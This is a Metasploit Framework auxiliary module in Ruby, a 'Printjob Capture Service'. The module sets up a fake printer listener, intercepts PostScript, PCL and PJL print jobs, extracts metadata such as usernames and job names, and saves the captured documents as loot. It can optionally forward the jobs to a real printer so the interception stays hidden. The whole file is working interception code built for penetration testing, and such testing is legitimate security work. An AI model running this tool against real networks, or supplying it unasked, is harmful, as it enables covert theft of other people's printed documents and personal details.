##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::TcpServer
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Printjob Capture Service',
      'Description' => %q{
        This module is designed to listen for PJL or PostScript print
        jobs. Once a print job is detected it is saved to loot. The
        captured printjob can then be forwarded on to another printer
        (required for LPR printjobs). Resulting PCL/PS files can be
        read with GhostScript/GhostPCL.

        Note, this module does not yet support IPP connections.
      },
      'Author'      =>     ['Chris John Riley', 'todb'],
      'License'     =>     MSF_LICENSE,
      'References'    =>
      [
        # Based on previous prn-2-me tool (Python)
        ['URL', 'http://blog.c22.cc/toolsscripts/prn-2-me/'],
        # Readers for resulting PCL/PC
        ['URL', 'http://www.ghostscript.com']
      ],
        'Actions'     =>
      [
        [ 'Capture' ]
      ],
        'PassiveActions' =>
      [
        'Capture'
      ],
        'DefaultAction'  => 'Capture'
    )

    register_options([
      OptPort.new('SRVPORT',      [ true, 'The local port to listen on', 9100 ]),
      OptBool.new('FORWARD',      [ true, 'Forward print jobs to another host', false ]),
      OptPort.new('RPORT',        [ false, 'Forward to remote port', 9100 ]),
      OptAddress.new('RHOST',     [ false, 'Forward to remote host' ]),
      OptBool.new('METADATA',     [ true, 'Display Metadata from printjobs', true ]),
      OptEnum.new('MODE',         [ true,  'Print mode', 'RAW', ['RAW', 'LPR']]) # TODO: Add IPP

    ], self.class)

    deregister_options('SSL', 'SSLVersion', 'SSLCert')

  end

  def setup
    super
    @state = {}

    begin

      @srvhost = datastore['SRVHOST']
      @srvport = datastore['SRVPORT'] || 9100
      @mode = datastore['MODE'].upcase || 'RAW'
      print_status("Starting Print Server on %s:%s - %s mode" % [@srvhost, @srvport, @mode])
      if datastore['FORWARD']
        @forward = datastore['FORWARD']
        @rport = datastore['RPORT'] || 9100
        if not datastore['RHOST'].nil?
          @rhost = datastore['RHOST']
          print_status("Forwarding all printjobs to #{@rhost}:#{@rport}")
        else
          raise ArgumentError, "Cannot forward without a valid RHOST"
        end
      end
      if not @mode == 'RAW' and not @forward
        raise ArgumentError, "Cannot intercept LPR/IPP without a forwarding target"
      end
      @metadata = datastore['METADATA']

      exploit()

    rescue  =>  ex
      print_error(ex.message)
    end
  end

  def on_client_connect(c)
    @state[c] = {
      :name => "#{c.peerhost}:#{c.peerport}",
      :ip => c.peerhost,
      :port => c.peerport,
      :user => nil,
      :pass => nil,
      :data => '',
      :raw_data => '',
      :prn_title => '',
      :prn_type => '',
      :prn_metadata => {},
      :meta_output => []
    }

    print_status("#{name}: Client connection from #{c.peerhost}:#{c.peerport}")
  end

  def on_client_data(c)
    curr_data = c.get_once
    @state[c][:data] << curr_data
    if @mode == 'RAW'
      # RAW Mode - no further actions
    elsif @mode == 'LPR' or @mode == 'IPP'
      response = stream_data(curr_data)
      c.put(response)
    end

    if (Rex::Text.to_hex(curr_data.first)) == '\x02' and (Rex::Text.to_hex(curr_data.last)) == '\x0a'
      print_status("LPR Jobcmd \"%s\" received" % curr_data[1..-2]) if not curr_data[1..-2].empty?
    end

    return if not @state[c][:data]
  end

  def on_client_close(c)
    print_status("#{name}: Client #{c.peerhost}:#{c.peerport} closed connection after %d bytes of data" % @state[c][:data].length)
    sock.close if sock

    # forward RAW data as it's not streamed
    if @forward and @mode == 'RAW'
      forward_data(@state[c][:data])
    end

    #extract print data and Metadata from @state[c][:data]
    begin
      # postscript data
      if @state[c][:data] =~ /%!PS-Adobe/i
        @state[c][:prn_type] = "PS"
        print_good("Printjob intercepted - type PostScript")
        # extract PostScript data including header and EOF marker
        @state[c][:raw_data] = @state[c][:data].match(/%!PS-Adobe.*%%EOF/im)[0]
        # pcl data (capture PCL or PJL start code)
      elsif @state[c][:data].unpack("H*")[0] =~ /(1b45|1b25|1b26)/
        @state[c][:prn_type] = "PCL"
        print_good("Printjob intercepted - type PCL")
        #extract everything between PCL start and end markers (various)
        @state[c][:raw_data] = Array(@state[c][:data].unpack("H*")[0].match(/((1b45|1b25|1b26).*(1b45|1b252d313233343558))/i)[0]).pack("H*")
      end

      # extract Postsript Metadata
      metadata_ps(c) if @state[c][:data] =~ /^%%/i

      # extract PJL Metadata
      metadata_pjl(c) if @state[c][:data] =~ /@PJL/i

      # extract IPP Metadata
      metadata_ipp(c) if @state[c][:data] =~ /POST \/ipp/i or @state[c][:data] =~ /application\/ipp/i

      if not @state[c][:prn_type]
        print_error("Unable to detect printjob type, dumping complete output")
        @state[c][:prn_type] = "Unknown Type"
        @state[c][:raw_data] = @state[c][:data]
      end

      # output discovered Metadata if set
      if @state[c][:meta_output] and @metadata
        @state[c][:meta_output].sort.each do | out |
          # print metadata if not empty
          print_status("#{out}") if not out.empty?
        end
      else
        print_status("No metadata gathered from printjob")
      end

      # set name to unknown if not discovered via Metadata
      @state[c][:prn_title] = 'Unnamed' if not @state[c][:prn_title]

      #store loot
      storefile(c) if not @state[c][:raw_data].empty?

      # clear state
      @state.delete(c)

    rescue  =>  ex
      print_error(ex.message)
    end
  end

  def metadata_pjl(c)
    # extract PJL Metadata

    @state[c][:prn_metadata] = @state[c][:data].scan(/^@PJL\s(JOB=|SET\s|COMMENT\s)(.*)$/i)
    print_good("Extracting PJL Metadata")
    @state[c][:prn_metadata].each do | meta |
      if meta[0] =~ /^COMMENT/i
        @state[c][:meta_output] << meta[0].to_s + meta[1].to_s
      end
      if meta[1] =~ /^NAME|^STRINGCODESET|^RESOLUTION|^USERNAME|^JOBNAME|^JOBATTR/i
        @state[c][:meta_output] << meta[1].to_s
      end
      if meta[1] =~ /^NAME/i
        @state[c][:prn_title] = meta[1].strip
      elsif meta[1] =~/^JOBNAME/i
        @state[c][:prn_title] = meta[1].strip
      end
    end
  end

  def metadata_ps(c)
    # extract Postsript Metadata

    @state[c][:prn_metadata] = @state[c][:data].scan(/^%%(.*)$/i)
    print_good("Extracting PostScript Metadata")
    @state[c][:prn_metadata].each do | meta |
      if meta[0] =~ /^Title|^Creat(or|ionDate)|^For|^Target|^Language/i
        @state[c][:meta_output] << meta[0].to_s
      end
      if meta[0] =~ /^Title/i
        @state[c][:prn_title] = meta[0].strip
      end
    end
  end

  def metadata_ipp(c)
    # extract IPP Metadata

    @state[c][:prn_metadata] = @state[c][:data]
    print_good("Extracting IPP Metadata")
    case @state[c][:prn_metadata]
    when /User-Agent:/i
      @state[c][:meta_output] << @state[c][:prn_metadata].scan(/^User-Agent:.*/i)
    when /Server:/i
      @state[c][:meta_output] << @state[c][:prn_metadata].scan(/^Server:.*/i)
    when /printer-uri..ipp:\/\/.*\/ipp\//i
      @state[c][:meta_output] << @state[c][:prn_metadata].scan(/printer-uri..ipp:\/\/.*\/ipp\//i)
    when /requesting-user-name..\w+/i
      @state[c][:meta_output] << @state[c][:prn_metadata].scan(/requesting-user-name..\w+/i)
    end
  end

  def forward_data(data_to_send)
    print_status("Forwarding PrintJob on to #{@rhost}:#{@rport}")
    connect
    sock.put(data_to_send)
    sock.close
  end

  def stream_data(data_to_send)
    vprint_status("Streaming %d bytes of data to #{@rhost}:#{@rport}" % data_to_send.length)
    connect if not sock
    sock.put(data_to_send)
    response = sock.get_once
    return response
  end

  def storefile(c)
    # store the file

    if @state[c][:raw_data]
      jobname = File.basename(@state[c][:prn_title].gsub("\\","/"), ".*")
      filename = "#{jobname}.#{@state[c][:prn_type]}"
      loot = store_loot(
        "prn_snarf.#{@state[c][:prn_type].downcase}",
        "#{@state[c][:prn_type]} printjob",
        c.peerhost,
        @state[c][:raw_data],
        filename,
        "PrintJob capture"
      )
      print_good("Incoming printjob - %s saved to loot" % @state[c][:prn_title])
      print_good("Loot filename: %s" % loot)
    end
  end

end
